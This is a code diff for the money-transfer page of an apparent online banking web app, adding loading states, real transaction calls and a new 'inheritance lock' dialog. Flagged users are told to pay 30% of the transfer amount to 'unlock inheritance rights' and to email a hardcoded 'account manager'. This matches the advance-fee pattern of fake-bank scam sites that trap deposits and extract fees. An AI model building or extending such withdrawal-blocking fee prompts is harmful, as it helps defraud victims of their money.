@@ -19,6 +19,15 @@ import { Send, User, Plus } from "lucide-react";
 import { Avatar, AvatarFallback } from "@/components/ui/avatar";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import api from "@/lib/api";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const Transfer = () => {
   const [accounts, setAccounts] = useState<any[]>([]);
@@ -27,6 +36,11 @@ const Transfer = () => {
   const [recipientType, setRecipientType] = useState<"contact" | "manual">(
     "contact"
   );
+  const [user, setUser] = useState<any>(null);
+  const [inheritanceLocked, setInheritanceLocked] = useState(false);
+  const [bankManagerEmail, setBankManagerEmail] = useState("");
+  const [showInheritanceDialog, setShowInheritanceDialog] = useState(false);
+  const [submitting, setSubmitting] = useState(false);
   const [formData, setFormData] = useState({
     fromAccount: "",
     recipient: "",
@@ -40,9 +54,14 @@ const Transfer = () => {
   });
 
   useEffect(() => {
-    Promise.all([api.getAccounts(), api.getTransactionsForUser()])
-      .then(([accountsRes, transactionsRes]) => {
+    Promise.all([api.getAccounts(), api.getTransactionsForUser(), api.me()])
+      .then(([accountsRes, transactionsRes, userRes]) => {
         setAccounts(accountsRes);
+        setUser(userRes);
+        setInheritanceLocked(userRes.inheritanceLocked || false);
+        setBankManagerEmail(
+          "joshuahartford@quentbank.com"
+        );
         // Extract recent contacts from transactions
         const contacts = transactionsRes
           .filter((t: any) => t.type === "debit" && t.category === "Transfer")
@@ -71,6 +90,12 @@ const Transfer = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
+    if (inheritanceLocked) {
+      setShowInheritanceDialog(true);
+      return;
+    }
+    
+    setSubmitting(true);
     try {
       // Validate form data
       if (!formData.fromAccount || !formData.amount) {
@@ -98,25 +123,36 @@ const Transfer = () => {
       }
       
       // Create transaction record
+      const description = recipientType === "contact" 
+        ? `Transfer to ${recentContacts.find(c => c.id === formData.recipient)?.name || "Contact"}`
+        : `Transfer to ${formData.recipientName}`;
+      
       const transactionData = {
-        type: "transfer",
+        accountId: formData.fromAccount,
+        amount: -amount, // negative for debit
+        type: "debit",
         transactionType: "expense",
-        amount: amount,
         currency: "USD",
-        description: recipientType === "contact" 
-          ? `Transfer to ${recentContacts.find(c => c.id === formData.recipient)?.name || "Contact"}`
-          : `Transfer to ${formData.recipientName}`,
-        category: "Transfer",
-        status: "completed",
-        fromAccount: formData.fromAccount,
-        toAccount: recipientType === "contact" ? formData.recipient : formData.recipientAccount,
-        note: formData.note
+        description,
+        category: "Transfer"
       };
       
       console.log("Creating transfer transaction:", transactionData);
       
-      // Here you would call the API to create the transaction
-      // await api.createTransaction(transactionData);
+      const response = await api.createTransaction(transactionData);
+      
+      if (response.alert) {
+        // Show inheritance alert
+        setShowInheritanceDialog(true);
+        return;
+      }
+      
+      // Update account balance in local state
+      setAccounts(prev => prev.map(acc => 
+        acc._id === formData.fromAccount 
+          ? { ...acc, balance: acc.balance - amount }
+          : acc
+      ));
       
       toast.success("Transfer initiated successfully!");
       
@@ -133,9 +169,11 @@ const Transfer = () => {
         note: "",
       });
       
-    } catch (error) {
+    } catch (error: any) {
       console.error("Transfer failed:", error);
-      toast.error("Transfer failed. Please try again.");
+      toast.error(error.message || "Transfer failed. Please try again.");
+    } finally {
+      setSubmitting(false);
     }
   };
 
@@ -229,11 +267,11 @@ const Transfer = () => {
                 </SelectTrigger>
                 <SelectContent>
                   {loading ? (
-                    <SelectItem value="" disabled>
+                    <SelectItem value="loading" disabled>
                       Loading accounts...
                     </SelectItem>
                   ) : accounts.length === 0 ? (
-                    <SelectItem value="" disabled>
+                    <SelectItem value="no-accounts" disabled>
                       No accounts available
                     </SelectItem>
                   ) : (
@@ -450,9 +488,19 @@ const Transfer = () => {
               type="submit"
               className="w-full bg-gradient-primary"
               size="lg"
+              disabled={submitting}
             >
-              <Send className="h-5 w-5 mr-2" />
-              Send Money
+              {submitting ? (
+                <>
+                  <div className="animate-spin rounded-full h-5 w-5 border-t-2 border-b-2 border-white mr-2"></div>
+                  Sending...
+                </>
+              ) : (
+                <>
+                  <Send className="h-5 w-5 mr-2" />
+                  Send Money
+                </>
+              )}
             </Button>
           </form>
         </Card>
@@ -473,6 +521,22 @@ const Transfer = () => {
           </ul>
         </Card>
       </motion.div>
+
+      <AlertDialog open={showInheritanceDialog} onOpenChange={setShowInheritanceDialog}>
+        <AlertDialogContent>
+          <AlertDialogHeader>
+            <AlertDialogTitle>Inheritance Error</AlertDialogTitle>
+            <AlertDialogDescription>
+              Your account has an inheritance lock. To proceed with this transfer, you must pay 30% of the transfer amount to unlock inheritance rights. Please contact your account manager at {bankManagerEmail} to clarify your inheritance issue. This message will persist until resolved.
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <AlertDialogFooter>
+            <AlertDialogAction onClick={() => setShowInheritanceDialog(false)}>
+              OK
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </DashboardLayout>
   );
 };
